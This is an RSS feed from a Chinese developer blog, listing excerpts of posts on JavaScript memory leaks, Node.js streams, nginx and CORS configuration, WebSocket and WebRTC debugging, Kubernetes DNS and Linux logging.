<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>洞香春</title>
    <link>https://wdd.js.org/</link>
    <description>Recent content on 洞香春</description>
    <image>
      <url>https://wdd.js.org/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://wdd.js.org/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 29 Oct 2022 11:52:59 +0800</lastBuildDate><atom:link href="https://wdd.js.org/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>JavaScript内存泄露分析</title>
      <link>https://wdd.js.org/fe/memory-leak-ppt/</link>
      <pubDate>Sat, 29 Oct 2022 11:52:59 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/memory-leak-ppt/</guid>
      <description>参考: http://slides.com/gruizdevilla/memory
内存是一张图 原始类型，只能作为叶子。原始类型不能引用其他类型 数字 字符串 布尔值 除了原始类型之外，其他类型都是对象，其实就是键值对 数组是一种特殊对象，它的键是连续的数字 内存从根开始 在浏览器中，根对象是window 在nodejs中，根对象是global 任何从根无法到达的对象，都会被GC回收，例如下图的节点9和10 根节点的GC是无法控制的 路径 从根节点开始到特定对象的路径，如下图的1-2-4-6-8 支配项 每个对象有且仅有一个支配项，支配项对对象可能不是直接引用 举例子 节点1支配节点2 节点2支持节点3、4、6 节点3支配节点5 节点6支配节点7 节点5支配节点8 上面的例子有个不好理解的是节点2为什么支配了节点6？如果节点A存在于从根节点到节点B的每一个路径中，那么A就是B的支配项。2存在于1-2-4-6，也存在于1-2-3-6，所以节点2支配节点6 V8 新生代与老生代 v8内存分为新生代和老生代内存，两块内存使用不同的内存GC策略 相比而言，新生代GC很快，老生代则较慢 新生代的内存在某些条件下会被转到老生代内存区 GC发生时，用可能应用会暂停 解除引用的一些错误 var a = {name: &amp;#39;wdd&amp;#39;} delete a.name // 这回让对象a变成慢对象 var a = {name: &amp;#39;wdd&amp;#39;} a.name = null // 这个则更好 关于slow Object V8 optimizing compiler makes assumptions on your code to make optimizations. It transparently creates hidden classes that represent your objects.</description>
    </item>
    
    <item>
      <title>JS内存泄漏分享</title>
      <link>https://wdd.js.org/fe/memory-leak-sharing/</link>
      <pubDate>Sat, 29 Oct 2022 11:47:38 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/memory-leak-sharing/</guid>
      <description>什么是内存泄漏？ 单位时间内的内存变化量可能有三个值
正数：内存可能存在泄漏。生产环境，如果服务在启动后，该值一直是正值，从未出现负值或者趋近于0的值，那么极大的可能是存在内存泄漏的。 趋近于0的值: 内存稳定维持 负数：内存在释放 实际上，在观察内存变化量时，需要有两个前提条件
一定的负载压力：因为在开发或者功能测试环境，很少的用户，服务的压力很小，是很难观测到内存泄漏问题的。所以务必在一定的负载压力下观测。 至少要观测一天：内存上涨并不一定意味着存在内存泄漏问题。在一个工作日中，某些时间点，是用户使用的高峰期，服务的负载很高，自然内存使用会增长。关键在于在高峰期过后的低谷期时，内存是否回下降到正常值。如果内存在低谷期时依然维持着高峰期时的内存使用，那么非常大可能是存在内存泄漏了。 下图是两个服务的。从第一天的0点开始观测服务的内存，一直到第二天的12点。正常的服务会随着负载的压力增加或者减少内存使用。而存在内存泄漏的服务，内存一直在上升，并且负载压力越大，上升的越快。
有没有可能避免内存泄漏？ 除非你不写代码，否者你是无法避免内存泄漏的问题的。
第一，即使你是非常精通某个语言，也是有很多关于如何避免内存泄漏的经验。但是你的代码里仍然可能会包含其他库或者其他同事写的代码，那些代码里是无法保证是否存在内存泄漏问题的。 第二，内存泄漏的代码有时候非常难以察觉。例如console.log打印的太快，占用太多的buffer。网络流量激增，占用太多的Recv_Q，node无法及时处理。写文件太慢，没有处理“后压”相关的逻辑等等。
为什么要关注内存泄漏？ 为什么要关注内存泄漏？我们客户的服务器可是有500G内存的
你可能有个很豪的金主。但是你不要忘记一个故事。
传说国际象棋是由一位印度数学家发明的。国王十分感谢这位数学家，于是就请他自己说出想要得到什么奖赏。这位数学家想了一分钟后就提出请求——把1粒米放在棋盘的第1格里，2粒米放在第2格，4粒米放在第3格，8粒米放在第4格，依次类推，每个方格中的米粒数量都是之前方格中的米粒数量的2倍。
国王欣然应允，诧异于数学家竟然只想要这么一点的赏赐——但随后却大吃了一惊。当他开始叫人把米放在棋盘上时，最初几个方格中的米粒少得像几乎不存在一样。但是，往第16个方格上放米粒时，就需要拿出1公斤的大米。而到了第20格时，他的那些仆人则需要推来满满一手推车的米。国王根本无法提供足够的大米放在棋盘上的第64格上去。因为此时，棋盘上米粒的数量会达到惊人的18 446 744 073 709 551 615粒。如果我们在伦敦市中心再现这一游戏，那么第64格中的米堆将延伸至M25环城公路，其高度将超过所有建筑的高度。事实上，这一堆米粒比过去1000年来全球大米的生产总量还要多得多。
对于内存泄漏来说，可能500G都是不够用的。
实际上操作系统对进程使用内存资源是有限制的，我们关注内存泄漏，实际上是关注内存泄漏会引起的最终问题：out of memory。如果进程使用的资源数引起了操作系统的注意，很可能进程被操作系统杀死。
然后你的客户可能正在使用你的服务完成一个重要的事情，接着你们的客户投诉热线回被打爆，然后是你的老板，你的领导找你谈话~~~
基本类型 vs 引用类型 基本类型：undefined, null, boolean, number, string。基本类型是按值访问 引用类型的值实际上是指向内存中的对象 上面的说法来自《JavaScript高级程序设计》。但是对于基本类型字符串的定义，实际上我是有些不认同的。有些人也认为字符串不属于基本类型。
就是关于字符串，我曾思考过，在JavaScript里，字符串的最大长度是多少，字符串最多能装下多少个字符？
我个人认为，一个变量有固定的大小的内存占用，才是基本类型。例如数字，null, 布尔值，这些值很容易能理解他们会占用固定的内存大小。但是字符串就不一样了。字符串的长度是不固定，在不同的浏览器中，有些字符串最大可能占用256M的内存，甚至更多。
可以参考这个问题：https://stackoverflow.com/questions/34957890/javascript-string-size-limit-256-mb-for-me-is-it-the-same-for-all-browsers
内存是一张图 1代表根节点，在NodeJS里是global对象，在浏览器中是window对象 2-6代表对象 7-8代表原始类型。分别有三种，字符串，数字，布尔值 9-10代表从根节点无法到达的对象 注意，作为原始类型的值，在内存图中只能是叶子节点。 ** 从跟节点R0无法到达的节点9,10，将会在GC时被清除。
保留路径的含义是从跟对象到某一节点的最短路径。例如1-&amp;gt;2-&amp;gt;4-&amp;gt;6。
对象保留树 节点： 构造函数的名称 边缘：对象的key 距离: 节点到跟节点的最短距离 支配项(Dominators) 每个对象有且仅有一个支配项 如果B存在从根节点到A节点之间的所有路径中，那么B是A的支配项，即B支配A。 下图中
1支配2 2支配3,4,6 (想想2为什么没有支配5？) 3支配5 6支配7 5支配8 理解支配项的意义在于理解如何将资源释放。如下图所示，如果目标是释放节点6的占用资源，仅仅释放节点3或者节点4是没有用的，必需释放其支配项节点2，才能将节点6释放。 对象大小 对象自身占用大小：shadow size 通过保持对其他对象的引用隐式占用，这种方式可以阻止这些对象被垃圾回收器（简称 GC）自动处置 对象的大小的单位是字节 分析工具 heapsnapshot import {writeHeapSnapshot} from &amp;#39;v8&amp;#39; router.</description>
    </item>
    
    <item>
      <title>NodeJS Out of Memory: Backpressuring in Streams</title>
      <link>https://wdd.js.org/fe/oom-backpressuring-in-streams/</link>
      <pubDate>Sat, 29 Oct 2022 11:46:07 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/oom-backpressuring-in-streams/</guid>
      <description>今天我收集了一份大概有40万行的日志，为了充分利用这份日志，我决定把日志给解析，解析完了之后，再写入mysql数据库。
首先，对于40万行的日志，肯定不能一次性读取到内存。
所以我用了NodeJs内置的readline模块。
const readline = require(&amp;#39;readline&amp;#39;) let line_no = 0 let rl = readline.createInterface({ input: fs.createReadStream(&amp;#39;./my.log&amp;#39;) }) rl.on(&amp;#39;line&amp;#39;, function(line) { line_no++; console.log(line) }) // end rl.on(&amp;#39;close&amp;#39;, function(line) { console.log(&amp;#39;Total lines : &amp;#39; + line_no); }) 数据解析以及写入到这块我没有贴代码。代码的执行是正常的，但是一段时间之后，程序就报错Out Of Memory。
代码执行是在nodejs 10.16.3上运行的，谷歌搜了一下解决方案，看到有人说nodejs升级到12.x版本就可以解决这个问题。我抱着试试看的想法，升级了nodejs到最新版，果然没有再出现OOM的问题。
后来我想，我终于深刻理解了NodeJS官网上的这篇文章 Backpressuring in Streams，以前我也度过几遍，但是不太了解，这次接合实际情况。有了深刻理解。
NodeJS在按行读取本地文件时，大概可以达到每秒1000行的速度，然而数据写入到MySql，大概每秒100次插入的样子。
本身网络上存在的延迟就要比读取本地磁盘要慢，读到太多的数据无法处理，只能暂时积压到内存中，然而内存有限，最终OOM的异常就抛出了。
NodeJS 12.x应该解决了这个问题。
参考 https://nodejs.org/en/docs/guides/backpressuring-in-streams/ </description>
    </item>
    
    <item>
      <title>new Date(&#39;time string&#39;)的陷阱</title>
      <link>https://wdd.js.org/fe/trap-of-new-date/</link>
      <pubDate>Sat, 29 Oct 2022 11:44:26 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/trap-of-new-date/</guid>
      <description>一般情况下，建议你不要用new Date(&amp;ldquo;time string&amp;rdquo;)的方式去做时间解析。因为不同浏览器，可能接受的time string的格式都不一样。
你最好不要去先入为主，认为浏览器会支持的你的格式。
常见的格式 2010-10-10 19:00:00 就这种格式，在IE11上是不接受的。
下面的比较，在IE11上返回false, 在chrome上返回true。原因就在于，IE11不支持这种格式。
new Date() &amp;gt; new Date(&amp;#39;2010-10-10 19:00:00&amp;#39;) 所以在时间处理上，最好选用比价靠谱的第三方库，例如dayjs， moment等等。
千万不要先入为主！！</description>
    </item>
    
    <item>
      <title>IE8/9 支持WebSocket方案，flash安全策略</title>
      <link>https://wdd.js.org/fe/ie89-websocket-flash/</link>
      <pubDate>Sat, 29 Oct 2022 11:43:23 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/ie89-websocket-flash/</guid>
      <description>IE8/9原生是不支持WebSocket的，但是我们可以使用flash去模拟一个WebSocket接口出来。
这方面，https://github.com/gimite/web-socket-js 已经可以使用。
除了客户端之外，服务端需要做个flash安全策略设置。
这里的服务端是指WebSocet服务器所在的服务端。默认端口是843端口。
客户端使用flash模拟WebSocket时，会打开一个到服务端843端口的TCP链接。
并且发送数据：
&amp;lt;policy-file-request&amp;gt;. 服务端需要回应下面类似的内容
&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE cross-domain-policy SYSTEM &amp;#34;/xml/dtds/cross-domain-policy.dtd&amp;#34;&amp;gt; &amp;lt;cross-domain-policy&amp;gt; &amp;lt;site-control permitted-cross-domain-policies=&amp;#34;all&amp;#34;/&amp;gt; &amp;lt;allow-access-from domain=&amp;#34;*&amp;#34; to-ports=&amp;#34;*&amp;#34; secure=&amp;#34;false&amp;#34;/&amp;gt; &amp;lt;allow-http-request-headers-from domain=&amp;#34;*&amp;#34; headers=&amp;#34;*&amp;#34;/&amp;gt; &amp;lt;/cross-domain-policy&amp;gt; Node.js实现 policy.js module.exports.policyFile = `&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE cross-domain-policy SYSTEM &amp;#34;/xml/dtds/cross-domain-policy.dtd&amp;#34;&amp;gt; &amp;lt;cross-domain-policy&amp;gt; &amp;lt;site-control permitted-cross-domain-policies=&amp;#34;all&amp;#34;/&amp;gt; &amp;lt;allow-access-from domain=&amp;#34;*&amp;#34; to-ports=&amp;#34;*&amp;#34; secure=&amp;#34;false&amp;#34;/&amp;gt; &amp;lt;allow-http-request-headers-from domain=&amp;#34;*&amp;#34; headers=&amp;#34;*&amp;#34;/&amp;gt; &amp;lt;/cross-domain-policy&amp;gt;` index.js const Net = require(&amp;#39;net&amp;#39;) const {policyFile} = require(&amp;#39;./policy&amp;#39;) const port = 843 console.log(policyFile) const server = new Net.Server() server.listen(port, function() { console.log(`Server listening for connection requests on socket localhost:${port}`); }); server.</description>
    </item>
    
    <item>
      <title>为什么vscode会占用大量CPU资源？</title>
      <link>https://wdd.js.org/fe/vscode-high-cpu/</link>
      <pubDate>Sat, 29 Oct 2022 11:42:19 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/vscode-high-cpu/</guid>
      <description>电脑的风扇声突然响了起来，我知道有某个进程在占用大量CPU资源。
在任务管理器中，可以看到vscode占用的的CPU资源达到150。说明问题出在vscode上。
在vscode中，按F1, 输入： show running extensions 可以查看所有插件的运行状况。
其中需要关注最重要的指标就是活动时间：如果某个插件的活动时间明显是其他插件的好多倍，那问题就可能出在这个插件上。要么禁用该插件，要么卸载该插件。</description>
    </item>
    
    <item>
      <title>js中二进制的操作</title>
      <link>https://wdd.js.org/fe/bin-number-operator/</link>
      <pubDate>Sat, 29 Oct 2022 11:41:13 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/bin-number-operator/</guid>
      <description>js原生支持16进制、10进制、8进制的直接定义
var a = 21 // 十进制 var b = 0xee // 十六进制, 238 var c = 013 // 八进制 11 十进制转二进制字符串 var a = 21 // 十进制 a.toString(2) // &amp;#34;10101&amp;#34; 二进制转10进制 var d = &amp;#34;10101&amp;#34; parseInt(&amp;#39;10101&amp;#39;,2) // 21 </description>
    </item>
    
    <item>
      <title>NodeJS边下载边解压gz文件</title>
      <link>https://wdd.js.org/fe/nodejs-stream-unzip/</link>
      <pubDate>Sat, 29 Oct 2022 11:39:37 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/nodejs-stream-unzip/</guid>
      <description>const fs = require(&amp;#39;fs&amp;#39;) var request = require(&amp;#39;request&amp;#39;) const zlib = require(&amp;#39;zlib&amp;#39;) const log = require(&amp;#39;./log.js&amp;#39;) const fileType = &amp;#39;&amp;#39; let endCount = 0 module.exports = (item) =&amp;gt; { return new Promise((resolve, reject) =&amp;gt; { request.get(item.url) .on(&amp;#39;error&amp;#39;, (error) =&amp;gt; { log.error(`下载失败${item.name}`) reject(error) }) .pipe(zlib.createGunzip()) .pipe(fs.createWriteStream(item.name + fileType)) .on(&amp;#39;finish&amp;#39;, (res) =&amp;gt; { log.info(`${++endCount} 完成下载 ${item.name + fileType}`) resolve(res) }) }) } </description>
    </item>
    
    <item>
      <title>V8 Profile</title>
      <link>https://wdd.js.org/fe/v8-profile/</link>
      <pubDate>Sat, 29 Oct 2022 11:37:55 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/v8-profile/</guid>
      <description>下面的命令可以生成一个v8的日志如 isolate-0x102d4e000-86008-v8.log
&amp;ndash;log-source-code 不是必传的字段，加了该字段可以在定位到源码 node --prof --log-source-code index.js 下一步是将log文件转成json
node --prof-process --preprocess isolate-0x102d4e000-86008-v8.log &amp;gt; v8.json 然后打开 https://wangduanduan.gitee.io/v8-profiling/ 这个页面，选择v8.json
下图横坐标是时间，纵坐标是cpu百分比。
选择Bottom Up之后，展开JS unoptimized, 可以发现占用cpu比较高的代码的位置。</description>
    </item>
    
    <item>
      <title>前端必会的nginx知识点</title>
      <link>https://wdd.js.org/fe/nginx-tips/</link>
      <pubDate>Sat, 29 Oct 2022 11:36:19 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/nginx-tips/</guid>
      <description>1. 启动？停止？reload配置 nginx -s reload # 热重启 nginx -s reopen # 重启Nginx nginx -s stop # 快速关闭 nginx -s quit # 等待工作进程处理完成后关闭 nginx -T # 查看配置文件的实际内容 2. nginx如何做反向http代理 location ^~ /api { proxy_pass http://192.168.40.174:32020; } 3. nginx要如何配置才能处理跨域问题 location ^~ /p/asm { proxy_pass http://192.168.40.174:32020; add_header &amp;#39;Access-Control-Allow-Origin&amp;#39; &amp;#39;*&amp;#39; always; add_header &amp;#39;Access-Control-Allow-Credentials&amp;#39; &amp;#39;true&amp;#39; always; add_header &amp;#39;Access-Control-Allow-Methods&amp;#39; &amp;#39;GET,POST,PUT,DELETE,PATCH,OPTIONS&amp;#39;; add_header &amp;#39;Access-Control-Allow-Headers&amp;#39; &amp;#39;Content-Type,ssid&amp;#39;; if ($request_method = &amp;#39;OPTIONS&amp;#39;) {return 204;} proxy_redirect off; proxy_set_header Host $host; } 4. 如何拦截某个请求，直接返回某个状态码？ location ^~ /p/asm { return 204 &amp;#34;OK&amp;#34;; } 5.</description>
    </item>
    
    <item>
      <title>WebSocket断开码测试</title>
      <link>https://wdd.js.org/fe/websocket-disconnect-test/</link>
      <pubDate>Sat, 29 Oct 2022 11:34:02 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/websocket-disconnect-test/</guid>
      <description>WebSocket断开码，一般是用到的是从1000-1015。
正常的断开码是1000。其他的都是异常断开。
场景 服务端断开码 备注 刷新浏览器页面 1001 终端离开, 可能因为服务端错误, 也可能因为浏览器正从打开连接的页面跳转离开. 关闭浏览器tab页面 1001 终端离开, 可能因为服务端错误, 也可能因为浏览器正从打开连接的页面跳转离开. 关闭浏览器, 所有标签页都会关闭。 1001 可以发现。无论是刷新，关闭tab页面还是关闭浏览器，错误码都是1001 ws.close() 1005 主动调用close, 不传递错误码。对服务端来说，也是异常断开。1005表示没有收到预期的状态码. ws.close(1000) 1000 正常的关闭，客户端必需传递正确的错误原因码。原因码不是随便填入的。比如 ws.close(1009)aFailed to execute &amp;lsquo;close&amp;rsquo; on &amp;lsquo;WebSocket&amp;rsquo;: The code must be either 1000, or between 3000 and 4999. 1009 is neither. 客户端断网 </description>
    </item>
    
    <item>
      <title>Node.js读取wav文件</title>
      <link>https://wdd.js.org/fe/nodejs-read-wav-file/</link>
      <pubDate>Sat, 29 Oct 2022 11:32:32 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/nodejs-read-wav-file/</guid>
      <description>相比于普通的文件，二进制的文件略显神秘。本次就为大家揭开二进制文件的面纱。
WAV文件的格式 下图是一个普通的wav文件的格式。其中除了最后的data部分，其他的每个格子都占用了固定大小的字节数。
知道字节数之后，就需要按照正确的字节序读区。字节序读反了，可能读出一堆乱码。 关于字节序，可以参考阮一峰老师写的理解字节序这篇文章。
step1: 读取文件 const fs = require(&amp;#39;fs&amp;#39;) const path = require(&amp;#39;path&amp;#39;) const file = fs.readFileSync(path.join(__dirname, &amp;#39;./a.wav&amp;#39;)) console.log(file) 原始的打印，二进制以16进制的方式显示。看不出其中有何含义。
node main.js &amp;lt;Buffer 52 49 46 46 a4 23 48 00 57 41 56 45 66 6d 74 20 10 00 00 00 01 00 02 00 40 1f 00 00 00 7d 00 00 04 00 10 00 64 61 74 61 80 23 48 00 00 00 00 00 00 00 .</description>
    </item>
    
    <item>
      <title>记一次WebRTC无回铃音问题排查</title>
      <link>https://wdd.js.org/fe/webrtc-has-no-earlymedia/</link>
      <pubDate>Sat, 29 Oct 2022 11:31:05 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/webrtc-has-no-earlymedia/</guid>
      <description>什么是回铃音？ 回铃音的特点
回铃音是由运营商送给手机的，而不是由被叫送给主叫的。 回铃音的播放阶段是在被叫接听前播放，被叫一旦接听，回铃音则播放结束 回铃音一般是450Hz, 嘟一秒，停4秒，5秒一个周期 回铃音分为三种
舒适噪音阶段：就是嘟一秒，停4秒的阶段 彩铃阶段：有的手机，在接听之前，会向主叫方播放个性化的语音，例如放点流行音乐之类的 定制回音阶段：例如被叫放立即把电话给拒绝了，但是主叫放这边并没有挂电话，而是在播放：对不起，您拨打的电话无人接听，请稍后再播 问题现象 WebRTC拨打出去之后，在客户接听之前，听不到任何回铃音。在客户接听之后，可以短暂的听到一点点回铃音。 问题排查思路 服务端问题 客户端问题 网络问题 网络架构 首先根据网络架构图，我决定在a点和b点进行抓包 抓包之后用wireshark进行分析。得出以下结论
sip服务器AB之间用的是g711编码，语音流没有加密。从b点抓的包，能够从中提取出SIP服务器B向sip服务器A发送的语音流，可以听到回铃音。说明SIP服务器A是收到了回铃音的。 ab两点之间的WebRTC语音流是加密的，无法分析出其中是否含有语音流。 虽然无法提取出WebRTC语音流。但是通过wireshark Statistics -&amp;gt; Conversation 分析，得出结论：在电话接通之前，a点收到的udp包和从b点发出的udp包的数量是是一致的。说明webrtc客户端实际上是收到了语音流。只不过客户端没有播放。然后问题定位到客户端的js库。 通过分析客户端库的代码，定位到具体代码的位置。解决问题，并向开源库提交了修复bug的的pull request。实际上只是修改了一行代码。https://github.com/versatica/JsSIP/pull/669 问题总结 解决问题看似很简单，但是需要的很强的问题分析能力，并且对网络协议，网络架构，wireshark抓包分析都要精通，才能真正的看到深层次的东西。</description>
    </item>
    
    <item>
      <title>WebRTC getUserMedia DOMException Requested Device not found</title>
      <link>https://wdd.js.org/fe/webrtc-domexception/</link>
      <pubDate>Sat, 29 Oct 2022 11:29:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/webrtc-domexception/</guid>
      <description>在PC端，使用WebRTC通话一般都会使用耳麦，如果耳麦有问题，可能就会报这个错。 所以最好多换几个耳麦，试试。</description>
    </item>
    
    <item>
      <title>stompjs 使用x-queue-name指定队列名</title>
      <link>https://wdd.js.org/fe/stompjs-set-queue-name/</link>
      <pubDate>Sat, 29 Oct 2022 11:26:30 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/stompjs-set-queue-name/</guid>
      <description>client.onConnect = function (frame) { console.log(&amp;#39;onConnect&amp;#39;, frame) client.subscribe(&amp;#39;/topic/event.agent.*.abc_cc&amp;#39;, function (msg) { console.log(msg) }, { id: &amp;#39;wdd&amp;#39;, &amp;#39;x-queue-name&amp;#39;: &amp;#39;wdd-queue&amp;#39; }) } 在mq管理端：
Optional Arguments Optional queue arguments, also known as &amp;ldquo;x-arguments&amp;rdquo; because of their field name in the AMQP 0-9-1 protocol, is a map (dictionary) of arbitrary key/value pairs that can be provided by clients when a queue is declared. -https://www.rabbitmq.com/queues.html</description>
    </item>
    
    <item>
      <title>parseInt(0.0000005)为什么等于5？</title>
      <link>https://wdd.js.org/fe/parseint-with-little-number/</link>
      <pubDate>Sat, 29 Oct 2022 11:22:57 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/parseint-with-little-number/</guid>
      <description>最近看了一篇文章，里面提出一个问题？
parseInt(0.0000005)为什么等于5？
最终也给出了解释，parseInt的第一个参数，如果不是字符串的话, 将会调用ToString方法，将其转为字符串。
string The value to parse. If this argument is not a string, then it is converted to one using theToStringabstract operation. Leadingwhitespacein this argument is ignored. MDN
我们在console面板上直接输入0.0000005回车之后发现是5e-7。我们使用toSting()方法转换之后发现是字符串5e7
字符串5e-7转成整数5是没什么疑问的，问题在于为什么0.0000005转成5e-7。而如果少一个零，就可以看到console会原样输出。
数值类型如何转字符串？ 对于数值类型，是使用Number.toString()方法转换的。
Number.toString(x)的算法分析 这个算法并没有像我们想象的那么简单。
先说一些简单场景
简单场景 Number.toString(x) 如果x是NaN, 返回&amp;quot;NaN&amp;quot; 如果x是+0或者-0， 返回&amp;quot;0&amp;quot; 如果x是负数返回, 返回Number.toString(-x) 如果x是正无穷，返回&amp;quot;Infinity&amp;quot; 复杂场景 可以看出，0.0000005并不在简单场景中。下面就进入到复杂场景了。
会用到一个公式
k,s,n都是整数 k大于等于1 10的k-1次方小于等于s, 且s小于等于10的k次方 10的n-k次方属于实数 0.0000005可以表示为5*10的-7次方。代入上面的公式，可以算出: k=1, s=5, n=-6。
参考 https://dmitripavlutin.com/parseint-mystery-javascript/ https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt https://tc39.es/ecma262/#sec-numeric-types-number-tostring </description>
    </item>
    
    <item>
      <title>{} Object.create({}) Object.create{null}的区别？</title>
      <link>https://wdd.js.org/fe/js-object-create/</link>
      <pubDate>Sat, 29 Oct 2022 11:20:09 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/js-object-create/</guid>
      <description>let a = {} let b = Object.create({}) let c = Object.create(null) console.log(a,b,c) 上面三个对象的区别是什么？</description>
    </item>
    
    <item>
      <title>奥科网关 Rtp Broken Connection</title>
      <link>https://wdd.js.org/opensips/rtp-broken-connection/</link>
      <pubDate>Sat, 29 Oct 2022 10:11:59 +0800</pubDate>
      
      <guid>https://wdd.js.org/opensips/rtp-broken-connection/</guid>
      <description>通话10多秒后，fs对两个call leg发送bye消息。
Bye消息给的原因是 Reason: Q.850 ;cause=31 ;text=”local, RTP Broken Connection”
在通话的前10多秒，SIP信令正常，双方也能听到对方的声音。
首先排查了下fs日志，没发现什么异常。然后根据这个报错内容，在网上搜了下。
发现了这篇文章 https://www.wavecoreit.com/blog/serverconfig/call-drop-transfer-rtp-broken-connection/
这篇文章给出的解决办法是通过配置了奥科AudioCodes网关来解决的。
然后咨询了下客户，证实他们用的也是奥科网关。所以就参考教程，配制了一下。
主要是在两个地方进行配置
Click Setup -&amp;gt; Signaling&amp;amp;Media -&amp;gt; Expand Coders &amp;amp; Profiles -&amp;gt; Click IP Profiles -&amp;gt; Edityour SFB Profile -&amp;gt; Broken Connection Mode-&amp;gt; Select Ignore -&amp;gt; Click Apply
Expand SIP Definitions -&amp;gt; Click SIP Definitions General Settings -&amp;gt; Broken Connection Mode -&amp;gt; Select Ignore -&amp;gt; Click Apply -&amp;gt; Click Save
这两个地方，都是配置Broken Connection Mode，选择ignore来设置的。
关于RTP的connection mode，有时间再研究下。</description>
    </item>
    
    <item>
      <title>优雅停止的pod</title>
      <link>https://wdd.js.org/container/terminating-with-grace/</link>
      <pubDate>Wed, 26 Oct 2022 08:59:44 +0800</pubDate>
      
      <guid>https://wdd.js.org/container/terminating-with-grace/</guid>
      <description>原文：https://cloud.google.com/blog/products/gcp/kubernetes-best-practices-terminating-with-grace
Editor’s note: Today is the fifth installment in a seven-part video and blog series from Google Developer Advocate Sandeep Dinesh on how to get the most out of your Kubernetes environment.
When it comes to distributed systems, handling failure is key. Kubernetes helps with this by utilizing controllers that can watch the state of your system and restart services that have stopped performing. On the other hand, Kubernetes can often forcibly terminate your application as part of the normal operation of the system.</description>
    </item>
    
    <item>
      <title>K8s pod node网络</title>
      <link>https://wdd.js.org/container/k8s-network/</link>
      <pubDate>Wed, 26 Oct 2022 08:57:54 +0800</pubDate>
      
      <guid>https://wdd.js.org/container/k8s-network/</guid>
      <description>1. 同一个Node上的pod网段相同 kube-node1 pod1: 172.16.30.8 pod2: 172.16.30.9 pod3: 172.16.30.23 kube-node2 pod4: 172.18.0.5 pod5: 172.18.0.6 2. pod中service name dns解析 使用nslookup命令去查询service name
第2行 DNS服务器名 第3行 DNS服务器地址 第5行 目标主机的名称 第6行 目标主机的IP地址 bash-5.0# nslookup security Server:	10.254.10.20 Address:	10.254.10.20#53 Name:	security.test.svc.cluster.local Address: 10.254.63.136 2.1. 问题1： 那么问题来了，为什么我要解析的域名是security, 但是返回的主机名是security.test.svc.cluster.local呢？
bash-5.0# cat /etc/resolv.conf nameserver 10.254.10.20 search test.svc.cluster.local svc.cluster.local cluster.local options ndots:5 在/etc/resolve.conf中，search选项后有几个值，它的作用是，如果你搜索的主机名中没有点, 那么你输入的名字就会和search选中的名字组合，也就是说。
你输入的是abc, 那么就会按照如何下的顺序去解析域名
abc.test.svc.cluster.local abc.svc.cluster.local cluster.local 所以我们看到的dns解析的名字就是abc.test.svc.cluster.local。
2.2. 问题2： 在resolve.conf中，dns服务器的地址是10.254.10.20，那么这个地址运行的是什么呢？
我们用dns反向解析，将IP解析为域名，可以看到主机的名称为kube-dns.kube-system.svc.cluster.local.
bash-5.0# nslookup 10.254.10.20 20.10.254.10.in-addr.arpa	name = kube-dns.</description>
    </item>
    
    <item>
      <title>Linux 日志系统简述</title>
      <link>https://wdd.js.org/posts/2022/linux-journal/</link>
      <pubDate>Wed, 26 Oct 2022 08:44:12 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2022/linux-journal/</guid>
      <description>1. 序言 日志文件包含系统的运行信息，包括内核、服务、应用程序等的日志。日志在分析系统故障、排查应用问题等方面，有着至关重要的作用。
2. 哪些进程负责管理日志？ 默认情况下，系统上有两个守护进程服务管理日志。journald和rsyslogd。
journald是systemd的一个组件，journald的负责收集日志，日志可以来自
Syslog日志 内核日志 初始化内存日志 启动日志 所有服务写到标准输出和标准错误的日志 journal收集并整理收到的日志，使其易于被使用。
有以下几点需要注意
默认情况下，journal的日志是不会持久化的。 journal的日志是二进制的格式，并不能使用文本查看工具，例如cat, 或者vim去分析。journal的日志需要用journalctl命令去读取。 journald会把日志写到一个socket中，rsyslog可以通过这个socket来获取日志，然后去写文件。
3. 日志文件文件位置 日志文件位置 /var/log/ 目录 4. 日志配置文件位置 /etc/rsyslog.conf rsyslogd配置文件 /etc/logrotate.conf 日志回滚的相关配置 /etc/systemd/journald.conf journald的配置文件 5. rsyslog.conf 5.1. 模块加载 注意 imjournal就是用来负责访问journal中的日志 imuxsock 提供本地日志输入支持，例如使用logger命令输入日志 $ModLoad imuxsock # provides support for local system logging (e.g. via logger command) $ModLoad imjournal # provides access to the systemd journal 5.2. 过滤 5.2.1. 优先级过滤 **模式：FACILITY.**PRIORITY
设备(FACILITY): kern (0), user (1), mail (2), daemon (3), auth (4), syslog (5), lpr (6), news (7), cron (8), authpriv (9), ftp (10), and local0 through local7 (16 - 23).</description>
    </item>
    
    <item>
      <title>Ubuntu 使用过程中遇到的问题以及解决方案</title>
      <link>https://wdd.js.org/posts/2022/ubuntu-tips/</link>
      <pubDate>Tue, 25 Oct 2022 12:56:41 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2022/ubuntu-tips/</guid>
      <description>1. ubuntu wine 微信中文乱码 修改文件 /opt/deepinwine/tools/run.sh /opt/deepinwine/tools/run_v2.sh 将WINE_CMD那行中加入LC_ALL=zh_CN.UTF-8
